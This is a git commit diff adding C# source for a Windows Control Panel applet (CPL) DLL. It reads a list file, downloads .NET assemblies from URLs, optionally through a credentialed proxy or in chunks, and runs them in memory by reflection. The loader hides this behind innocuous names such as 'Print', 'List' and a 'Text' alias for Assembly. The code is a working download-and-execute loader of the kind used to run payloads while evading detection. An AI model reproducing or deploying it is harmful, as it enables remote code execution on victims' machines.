918c54d27acadbc55f216de5f4ae9fa770b6e3b4
renato cruz <up201405867@fe.up.pt>
2023-02-08 23:58:18 +0000

    Refractored code to be more flexible, and use multiple features together, and easier to implement new features

---
+++ CPL/CPL/Channel.cs
@@ -0,0 +1,170 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Net;
+using System.Threading;
+
+namespace CPL
+{
+    class Channel
+    {
+        Dictionary<string, Action<string>> dict;
+
+        WebClient client = null;
+        public Func<string, int, int, byte[]> fetch;
+
+        string key = null;
+        string chunks = null;
+        public string url = null;
+
+        public Channel()
+        {
+            this.dict = new Dictionary<string, Action<string>>();
+            this.dict.Add("proxy", setProxy);
+            this.dict.Add("chunks", setChunks);
+            this.dict.Add("key", setKey);
+
+            this.fetch = GetBytes;
+
+            this.client = new WebClient();
+        }
+
+        public int parse(string[] words)
+        {
+            int len = words.Length;
+            for (int i = 0; i < len; i++)
+            {
+                if (words[i].StartsWith("http"))
+                {
+                    this.url = words[i];
+                    return i - 1;
+                }
+
+
+                this.dict[words[i]](words[i + 1]);
+
+                // Skip args
+                i++;
+            }
+
+            return 0;
+        }
+
+        private void setProxy(string proxy)
+        {
+            // remove [http://]<user>:<pass>@<ip>:<port> if present
+            if (proxy.StartsWith("http://"))
+            {
+                // proxy = proxy.Remove(0, 6);
+            }
+
+            string uri;
+            string[] creds = null;
+
+            if (proxy.Contains("@"))
+            {
+                // Separate <user>:<pass> @ <ip>:<port>
+                string[] splitd = proxy.Split('@');
+                creds = splitd[0].Split(':');
+                uri = "http://" + splitd[1];
+            }
+            else
+                uri = "http://" + proxy;
+
+            Console.WriteLine("{0}", uri);
+
+            WebProxy wp = new WebProxy(new Uri(uri));
+
+            if (creds != null)
+            {
+                wp.Credentials = new NetworkCredential(creds[0], creds[1]);
+                wp.UseDefaultCredentials = false;
+            }
+
+            this.client.Proxy = wp;
+        }
+
+        private void setChunks(string chunks)
+        {
+            this.chunks = chunks;
+            this.fetch = GetChunked;
+        }
+
+        private void setKey(string key)
+        {
+            this.key = key;
+            // Not implemented
+        }
+
+        byte[] GetChunked(string url, int retry = 3, int timeout = 1)
+        {
+            Console.WriteLine("Getting {0} chunks of {1}", this.chunks, url);
+            string[] splitd = url.Split('/');
+            string executable = splitd[splitd.Length - 1];
+            string filename = executable.Split('.')[0];
+
+            byte[] str = null;
+
+            string endpoint = String.Format("{0}//{1}/{2}/{2}.", splitd[0], splitd[2], filename, filename);
+            int num = Int32.Parse(this.chunks);
+            for (int i = 0; i <= num; i++)
+            {
+                byte[] chunk = null;
+
+                while (retry >= 0 && chunk == null)
+                {
+
+                    string url_chunk = String.Format("{0}{1}", endpoint, i.ToString("D2"));
+                    chunk = this.GetBytes(url_chunk, retry, timeout);
+
+                    // First chunk
+                    if (str == null)
+                        str = chunk;
+                    else
+                    {
+                        int current_lenght = str.Length;
+                        Array.Resize(ref str, str.Length + chunk.Length);
+                        Array.Copy(chunk, 0, str, current_lenght, chunk.Length);
+                    }
+                }
+                if (chunk == null)
+                {
+                    Environment.Exit(-1);
+                }
+            }
+            return str;
+        }
+
+        byte[] GetBytes(string url, int retry = 3, int timeout = 1)
+        {
+            Console.WriteLine($"{url}");
+
+            // If https desired
+            // ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
+            byte[] str = null;
+            while (retry >= 0 && str == null)
+            {
+                try
+                {
+                    str = this.client.DownloadData(url);
+                }
+                catch (WebException ex) when (ex.Status is WebExceptionStatus.Timeout)
+                {
+                    Console.WriteLine("[-] {0} timed out, retrying...", url);
+                    retry--;
+                    Thread.Sleep(timeout * 10000);
+                }
+                catch (WebException ex)
+                {
+                    Console.WriteLine("[-] Error: {0} - {1}.", url, ex.Status);
+                    break;
+                }
+            }
+            if (str == null)
+            {
+                Environment.Exit(-1);
+            }
+
+            return str;
+        }
+    }
+}
---
+++ CPL/CPL/List.cs
@@ -0,0 +1,120 @@
+﻿using System;
+using System.Runtime.InteropServices;
+using System.IO;
+using Text = System.Reflection.Assembly;
+using System.Linq;
+
+namespace CPL
+{
+    public class List
+    {
+        const uint ATTACH_PARENT_PROCESS = 0x0ffffffff;  // default value if not specifing a process ID
+        const int ERROR_ACCESS_DENIED = 5; // process was already attached to another console
+        public static string files = "list.txt";
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        static extern bool AttachConsole(uint dwProcessID);
+
+        [DllImport("kernel32", SetLastError = true)]
+        static extern bool AllocConsole();
+        private static void AllocateConsole()
+        {
+            //
+            // the following should only be used in a non-console application type (C#)
+            // (since a console is allocated/attached already when you define a console app.. :) )
+            //
+            if (!AttachConsole(ATTACH_PARENT_PROCESS) && Marshal.GetLastWin32Error() == ERROR_ACCESS_DENIED)
+            {
+                // A console was not allocated, so we need to make one.
+                if (!AllocConsole())
+                {
+                    Console.WriteLine("A console could not be allocated, sorry!");
+                    throw new Exception("Console Allocation Failed");
+                }
+                else
+                {
+                    Console.WriteLine("Is Attached, press a key...");
+                    Console.ReadKey(true);
+                    // you now may use the Console.xxx functions from .NET framework
+                    // and they will work as normal
+                }
+            }
+            else
+                Console.WriteLine("Error allocating console, no output will be shown!");
+        }
+
+        // Invoke stuff
+        static void Print(byte[] str, string[] args)
+        {
+            Text text = Text.Load(str);
+            Print(text, args);
+        }
+        static void Print(string file, string[] args)
+        {
+            Text text = Text.LoadFile(file);
+            Print(text, args);
+        }
+        static void Print(Text text, string[] args)
+        {
+            text.EntryPoint.Invoke(null, new object[] { args });
+        }
+
+        // Process file
+        static int CrossReflect()
+        {
+            // Check if list.txt config file exists           
+            string configfile = Path.GetFullPath(files);
+            if (!File.Exists(files))
+            {
+                Console.WriteLine("[-] File not found.");
+                return -1;
+            }
+            Console.WriteLine("[+] {0} found, processing list of files", files);
+            string[] executables = File.ReadAllLines(configfile);
+
+            // Process each line
+            foreach (string file in executables)
+            {
+                string escape = "%%THIS%%";
+                Console.WriteLine("[+] Processing {0}", file);
+
+                // Skip commented lines
+                if (file.StartsWith("#"))
+                    continue;
+
+                string replaced = file.Replace("\\ ", escape); // Escape spaces in arguments
+                string[] words = replaced.Split(' '); // Parse line <exe> <arg 1> <arg 2> ... <arg n
+
+                // Local file found
+                if (File.Exists(words[0]))
+                {
+                    Print(words[0], words.Skip(1).ToArray());
+                    continue;
+                }
+
+                // Build new channel for each line
+                Channel chan = new Channel();
+                int skip = chan.parse(words);
+                string[] args = words.Skip(skip).ToArray(); // get args
+
+                byte[] text = chan.fetch(chan.url, 3, 1);
+                Print(text, args);
+
+                Console.WriteLine("[+] Finished");
+            }
+
+            Console.WriteLine("[+] Done executing");
+            return 0;
+        }
+
+        [DllExport]
+        public static int CPlApplet(int a, int b, string c, int d)
+        {
+            AllocateConsole();
+
+            return CrossReflect();
+        }
+
+    }
+
+}
